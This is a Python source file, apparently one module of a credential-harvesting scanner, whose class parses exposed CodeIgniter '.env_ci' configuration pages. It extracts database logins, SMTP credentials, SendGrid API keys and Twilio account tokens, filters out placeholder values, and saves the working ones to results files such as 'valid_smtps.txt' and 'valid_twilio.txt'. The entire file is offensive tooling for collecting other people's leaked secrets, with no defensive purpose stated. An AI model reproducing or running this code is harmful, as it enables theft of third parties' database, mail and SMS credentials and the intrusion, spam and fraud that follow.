import urllib.parse
from re import findall as reg


class CILaravel:

    def databases(self, page, star):
        global url, method, db_database, db_host, db_password, db_username, db_port, db_connection
        try:
            if "database.default.DBDriver" in page:
                if 'database.default.DBDriver = ' in page:
                    method = '/.env_ci'
                    try:
                        url = reg('\napp.baseURL = (.*?)\n', page)[0].replace("'", "").replace('"', "")
                        if "localhost" in url:
                            url = star
                        elif "127.0.0.1" in url:
                            url = star
                        count_slashes = 0
                        for i in url.split("://")[1]:
                            if i == "/":
                                count_slashes += 1
                        if count_slashes >= 1:
                            test = url.split("://")[1].split("/")[0]
                            voorste = url.split("://")[0]
                            url = voorste + "://" + test
                        elif count_slashes == 1:
                            voorste = url.split("://")[0]
                            url = voorste + "://" + url.split("://")[1]
                        elif count_slashes <= 1:
                            url = url
                        else:
                            url = url
                    except:
                        url = star
                    try:
                        db_connection = reg('\ndatabase.default.DBDriver = (.*?)\n', page)[0]
                    except:
                        db_connection = 'mysql'
                    try:
                        db_host = reg('\ndatabase.default.hostname = (.*?)\n', page)[0]
                        if "localhost" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                        elif "127.0.0.1" in db_host:
                            db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                        else:
                            db_host = db_host
                    except:
                        db_host = star.replace("http://", "").replace("https://", "").split(":")[0]
                    try:
                        db_port = reg('\ndatabase.default.port = (.*?)\n', page)[0]
                        if db_port == "null":
                            db_port = "3306"
                        else:
                            db_port = db_port
                    except:
                        db_port = "3306"
                    try:
                        db_database = reg('\ndatabase.default.database = (.*?)\n', page)[0]
                    except:
                        db_database = ''
                    try:
                        db_username = reg('\ndatabase.default.username = (.*?)\n', page)[0]
                    except:
                        db_username = ''
                    try:
                        db_password = reg('\ndatabase.default.password = (.*?)\n', page)[0]
                    except:
                        db_password = ''
                if db_username == '' or db_password == '' or db_username == 'null' or db_password == 'null':
                    return False
                else:
                    build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nDB_CONNECTION: ' + str(
                        db_connection) + '\nDB_HOST: ' + str(db_host) + '\nDB_PORT: ' + str(
                        db_port) + '\nDB_DATABASE: ' + str(db_database) + '\nDB_USERNAME: ' + str(
                        db_username) + '\nDB_PASSWORD: ' + str(db_password)
                    remover = str(build).replace('\r', '').replace('"', '').replace("'", "")
                    save = open('Results/DATABASE.txt', 'a')
                    save.write(remover + '\n\n')
                    save.close()
                    return url, method, db_connection, db_host, db_port, db_database, db_username, db_password
            else:
                return False
        except Exception as e:
            return False

    def smtps(self, page, url):
        global smtp_username, smtp_password, smtp_host, smtp_port, smtp_from, smtp_name
        method = "/.env_ci"
        try:
            if "email.SMTPHost" in page:
                if "email.SMTPHost = " in page:
                    try:
                        smtp_host = reg("\nemail.SMTPHost = (.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_host = ''
                    try:
                        smtp_username = reg("\nemail.SMTPUser = (.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_username = ''
                    try:
                        smtp_password = reg("\nemail.SMTPPass = (.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_password = ''
                    try:
                        smtp_port = reg("\nemail.SMTPPort = (.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_port = "587"
                    try:
                        smtp_from = reg("\nemail.SMTPFrom = (.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_from = smtp_username
                    try:
                        smtp_name = reg("\nemail.SMTPFromName = (.*?)\n", page)[0].replace("\n", ""). \
                            replace("\r", "").replace('"', '')
                    except:
                        smtp_name = ''
                if smtp_username == '' or smtp_password == '' or smtp_username == 'null' or smtp_password == 'null' or \
                        smtp_username == '""' or smtp_password == '""' or smtp_host == "smtp.mailtrap.io" or \
                        smtp_username == "SMTP_USERNAME" and smtp_password == "SMTP_PASSWORD":
                    return False
                else:
                    build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nMAILHOST: ' + str(
                        smtp_host) + '\nMAILPORT: ' + str(smtp_port) + '\nMAILUSER: ' + str(
                        smtp_username) + '\nMAILPASS: ' + str(smtp_password) + '\nMAILFROM: ' + str(
                        smtp_from) + '\nFROMNAME: ' + str(smtp_name)
                    if "apikey" in smtp_username and "sendgrid" in smtp_host:
                        builder = str(smtp_username) + '|' + smtp_password
                        remover = builder.replace('\r', '')
                        sendgridsmtp = open('Results/sendgrid_api.txt', 'a')
                        sendgridsmtp.write(remover + '\n')
                        sendgridsmtp.close()
                        remover = str(build).replace('\r', '')
                        sendgridlong = open('Results/sendgrid_api_full.txt', 'a')
                        sendgridlong.write(remover + '\n\n')
                        sendgridlong.close()
                        return smtp_host, smtp_port, smtp_username, smtp_password, smtp_from
                    else:
                        remover = build.replace('\r', '')
                        smtps = open("Results/valid_smtps.txt", "a")
                        smtps.write(remover + '\n\n')
                        smtps.close()
                        return smtp_host, smtp_port, smtp_username, smtp_password, smtp_from
            else:
                return False
        except:
            return False

    def twilio_apis(self, page):
        global acc_key, acc_sec, acc_num
        try:
            if "twilio.tw_prod_token" in page:
                if "twilio.tw_prod_token = " in page:
                    try:
                        acc_key = reg("\ntwilio.tw_prod_SID = (.*?)\n", page)[0]
                    except:
                        acc_key = ''
                    try:
                        acc_sec = reg("\ntwilio.tw_prod_token = (.*?)\n", page)[0]
                    except:
                        acc_sec = ''
                    try:
                        acc_num = reg("\ntwilio.tw_number = (.*?)\n", page)[0]
                    except:
                        acc_num = ''
                if acc_key == '' or acc_sec == '' or acc_key == 'null' or acc_sec == 'null' or acc_key == '""' or \
                        acc_sec == '""' or acc_key == "TWILIO_SID" or acc_sec == "TWILIO_TOKEN":
                    return False
                else:
                    build = acc_key + '|' + acc_sec + "|" + acc_num
                    remover = build.replace('\r', '')
                    twill = open("Results/valid_twilio.txt", "a")
                    twill.write(remover + '\n')
                    twill.close()
                    return acc_key, acc_sec
            else:
                return False
        except Exception:
            return False
